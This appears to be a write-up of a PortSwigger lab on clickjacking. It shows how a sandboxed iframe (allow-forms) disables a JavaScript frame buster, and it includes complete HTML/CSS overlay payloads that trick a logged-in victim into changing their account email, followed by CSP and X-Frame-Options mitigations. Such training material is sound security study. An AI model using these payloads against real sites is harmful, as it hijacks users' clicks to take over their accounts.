# 📘 PortSwigger Lab: Clickjacking with a frame buster script

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-frame-busting-scripts/clickjacking/lab-frame-buster-script
> 🎯 Topic: Clickjacking (UI redressing) — Bypassing frame buster scripts using HTML5 sandbox
> 🧪 Difficulty: Apprentice
> ✅ Status: Solved

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📡 What is a Frame Buster Script?](#framebuster)
- [⚡ The HTML5 Sandbox Bypass Technique](#iframe)
- [🔍 Step 1 — Observe the Frame Buster in Action](#step1)
- [🔍 Step 2 — Construct the Base Exploit Payload with Sandbox](#step2)
- [🔍 Step 3 — Calibrate the Decoy Element](#step3)
- [🔍 Step 4 — Cloak the Target Frame](#step4)
- [🔍 Step 5 — Deliver Exploit to Victim](#step5)
- [📨 Example HTML Payload](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Use UI redressing techniques to:

```text
1. Bypass the target application's client-side frame buster script.
2. Pre-populate the "Email" input field using a URL GET parameter.
3. Construct an HTML page that securely frames the account settings page without triggering a redirect.
4. Trick a logged-in user into clicking a decoy button ("Click me").
5. Force the user to unknowingly click the hidden "Update email" button.
```

<a id="theory"></a>

## 🧠 Short Theory
Before standard HTTP headers (`X-Frame-Options` and `Content-Security-Policy`) were widely adopted, developers attempted to prevent clickjacking using client-side JavaScript. These scripts, known as **frame busters**, typically check if the current window is the top-level window. If it isn't, the script forces the browser's top window to navigate to the framed page's URL, effectively "breaking out" of the iframe.

However, client-side protections are fundamentally flawed because the attacker controls the environment (the parent window) in which the target application runs.

<a id="idea"></a>

## 🧩 Core Idea
The attacker uses the HTML5 `sandbox` attribute on the `iframe` element to restrict the capabilities of the embedded application. By selectively granting permissions, the attacker can allow the form to function while simultaneously blocking the JavaScript frame buster from executing its escape maneuver.

```text
Attacker site:      Embeds the target in a sandboxed iframe.
Sandbox limits:     Allows form submission, but denies top-level navigation.
Target JS:          Attempts to redirect the top window, but the browser blocks it.
Victim clicks:      Browser sends a POST request with the prefilled email.
Target server:      Updates the victim's email address ✅
```

<a id="framebuster"></a>

## 📡 What is a Frame Buster Script?
A typical frame buster script looks something like this:
```javascript
if (top != self) {
    top.location = self.location;
}
```
If a malicious site tries to frame this page, the script detects that `top` (the main browser window) is not equal to `self` (the framed window). It then overwrites the main window's URL, destroying the attacker's clickjacking overlay.

<a id="iframe"></a>

## ⚡ The HTML5 Sandbox Bypass Technique
The `sandbox` attribute applies a strict set of restrictions to an iframe.

```html
<iframe sandbox="allow-forms" src="..."></iframe>
```
By explicitly setting `sandbox="allow-forms"`:
1. `allow-forms` permits the victim to submit the "Update email" form.
2. The *absence* of `allow-scripts` disables JavaScript entirely (neutralizing the script).
3. The *absence* of `allow-top-navigation` prevents any script from redirecting the parent window.

<a id="step1"></a>

## 🔍 Step 1 — Observe the Frame Buster in Action
Log in to the vulnerable application (`wiener:peter`).

Go to the Exploit Server and try framing the page *without* a sandbox attribute:
```html
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```
Click **Store** and **View exploit**. You will notice that the Exploit Server immediately disappears, and you are redirected to the target site's account page. This confirms the frame buster is active.

<a id="step2"></a>

## 🔍 Step 2 — Construct the Base Exploit Payload with Sandbox
In the Exploit Server Body, insert the HTML structure. Crucially, add `sandbox="allow-forms"` to the iframe and include the pre-population parameter.

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:385px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms" src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@test.com"></iframe>
```

<a id="step3"></a>

## 🔍 Step 3 — Calibrate the Decoy Element
Set the iframe `opacity` to `0.1`.

Click **Store** and then **View exploit**. Notice that the page no longer redirects! The sandbox successfully neutralized the frame buster.

Adjust the `top` and `left` pixel values of the `div` until "Test me" is perfectly centered underneath the **"Update email"** button.

*Caution: Do not click the button during testing.*

<a id="step4"></a>

## 🔍 Step 4 — Cloak the Target Frame
Once alignment is perfect, finalize the payload for the victim:

- Change the decoy text from "Test me" to "Click me".
- Change the iframe `opacity` from `0.1` to `0.0001`.
- Change the email address in the `src` URL to a completely fresh, unique email (e.g., `sandboxed_pwn@attacker.com`).

<a id="step5"></a>

## 🔍 Step 5 — Deliver Exploit to Victim
Click **Store** to save the final invisible payload.

Click **Deliver exploit to victim**.

The victim's browser will load the exploit, block the frame buster, and successfully capture the victim's click on the hidden form.

<a id="examples"></a>

## 📨 Example HTML Payload
Exploit Payload (Exploit Server Body)
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:385px; 
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=busted@evil.com"></iframe>
```

<a id="response"></a>

## 📥 Example Result
Victim Interaction (Silent Success)
```text
1. Victim navigates to the Exploit Server URL.
2. The browser attempts to run the target's frame buster JS but blocks it due to the sandbox.
3. Victim sees a blank page with a "Click me" text and clicks it.
4. The click hits the "Update email" button.
5. The form is submitted. The victim's account email is successfully changed.
```

Lab status:

```text
Solved
```

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain
```text
1. Identify sensitive form (Email update).
2. Discover that the target uses a JS frame buster to prevent framing.
3. Construct an iframe payload utilizing the HTML5 sandbox attribute (`allow-forms`).
4. Inject the malicious URL parameter (`?email=...`) into the iframe src.
5. Overlay a decoy element beneath the "Update email" button.
6. Calibrate coordinates using semi-transparent opacity (0.1).
7. Set opacity to 0.0001.
8. Deliver the hosted HTML payload to the victim.
9. Lab marked as Solved.
```

<a id="breakdown"></a>

## 🔬 Why the Attack Worked
1. Client-Side Protections are Flawed
The target relied on JavaScript to protect against framing.

2. HTML5 Sandbox Restrictions
The `sandbox` attribute gave the attacker granular control over the iframe's capabilities. By withholding `allow-top-navigation` and `allow-scripts`, the browser actively defended the attacker's exploit from the target's defensive script.

3. Legitimate Session Context
Because the iframe still loads within the victim's browser context (despite the sandbox), cookies and CSRF tokens functioned normally to authorize the form submission.

<a id="pentester"></a>

## 🧠 Pentester Mindset
When testing web applications for advanced Clickjacking:

```text
If a site refuses to load in an iframe and redirects the top window, is it using proper HTTP headers or just JavaScript?
Can I bypass the JS protection using `sandbox="allow-forms"`?
Does the site break completely if `allow-scripts` is omitted, or does the core HTML form still function?
```

<a id="mistakes"></a>

## ❌ Common Mistakes
Mistake 1. Adding `allow-top-navigation`
If you include `allow-top-navigation` in your sandbox attribute, you re-enable the frame buster's ability to redirect the page, and your exploit will destroy itself upon loading.

Mistake 2. Adding `allow-scripts` unnecessarily
If the target form relies purely on standard HTML `<form action="..." method="POST">`, you do not need `allow-scripts`. Including it might allow the frame buster to execute alternative defensive measures.

<a id="defense"></a>

## 🛡 Mitigation
1. Abandon JavaScript Frame Busters
Client-side scripts are not a reliable security mechanism against framing. They can be trivially bypassed using standard browser features.

2. Enforce HTTP Headers (Primary Defense)
Implement robust server-side protection using modern HTTP headers. The browser enforces these *before* rendering the DOM or processing sandbox attributes:
- `Content-Security-Policy: frame-ancestors 'none';` (Recommended modern approach)
- `X-Frame-Options: DENY` or `SAMEORIGIN` (Legacy support)

<a id="checklist"></a>

## ✅ Checklist
Reconnaissance
- [ ] Logged in to the application
- [ ] Observed the frame buster script in action
Payload Generation
- [ ] Created iframe structure with `sandbox="allow-forms"`
- [ ] Injected the malicious URL parameter into the iframe `src`
Execution & Verification
- [ ] Verified the frame buster is neutralized (no redirect occurs)
- [ ] Aligned decoy exactly beneath the "Update email" button
- [ ] Changed the target email to a unique value
- [ ] Changed text to "Click me" and opacity to `0.0001`
- [ ] Delivered exploit to victim
- [ ] Lab status: Solved

<a id="conclusion"></a>

## 🧾 Conclusion
The lab demonstrated how to defeat legacy client-side clickjacking protections:

```text
1. Proved that JavaScript frame busters are an ineffective security measure.
2. Utilized the HTML5 `sandbox` attribute to disarm the defensive script while keeping the target form operational.
3. Successfully tricked the victim into submitting attacker-controlled data.
```

Main lessons:
```text
- Never rely on client-side JavaScript for security enforcement.
- The HTML5 sandbox is a powerful tool for attackers to isolate and manipulate framed content.
- HTTP headers (`CSP` and `X-Frame-Options`) are the only reliable defense against clickjacking.
```
[⬆ Back to top](#top)
